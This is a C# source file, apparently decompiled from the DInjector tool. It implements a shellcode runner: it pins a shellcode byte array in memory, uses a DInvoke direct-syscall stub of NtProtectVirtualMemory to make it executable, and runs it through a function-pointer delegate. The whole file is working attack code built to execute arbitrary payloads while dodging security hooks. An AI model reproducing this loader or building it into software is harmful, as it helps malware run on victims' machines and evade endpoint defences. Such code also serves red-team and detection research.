using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x0200000D RID: 13
	internal class FunctionPointerV2
	{
		// Token: 0x0600002D RID: 45 RVA: 0x00003BBC File Offset: 0x00001DBC
		public unsafe static void Execute(byte[] shellcodeBytes)
		{
			fixed (byte[] array = shellcodeBytes)
			{
				byte* value;
				if (shellcodeBytes == null || array.Length == 0)
				{
					value = null;
				}
				else
				{
					value = &array[0];
				}
				IntPtr intPtr = (IntPtr)((void*)value);
				FunctionPointerV2.NtProtectVirtualMemory ntProtectVirtualMemory = (FunctionPointerV2.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(FunctionPointerV2.NtProtectVirtualMemory));
				IntPtr ptr = intPtr;
				IntPtr intPtr2 = (IntPtr)shellcodeBytes.Length;
				uint num;
				DInvoke.Data.Native.NTSTATUS ntstatus = ntProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref intPtr, ref intPtr2, 32U, out num);
				if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
				{
					Console.WriteLine("(FunctionPointerV2) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
				}
				else
				{
					Console.WriteLine(string.Format("(FunctionPointerV2) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {0}", ntstatus));
				}
				((FunctionPointerV2.pFunction)Marshal.GetDelegateForFunctionPointer(ptr, typeof(FunctionPointerV2.pFunction)))();
			}
		}

		// Token: 0x02000040 RID: 64
		// (Invoke) Token: 0x06000092 RID: 146
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

		// Token: 0x02000041 RID: 65
		// (Invoke) Token: 0x06000096 RID: 150
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate void pFunction();
	}
}
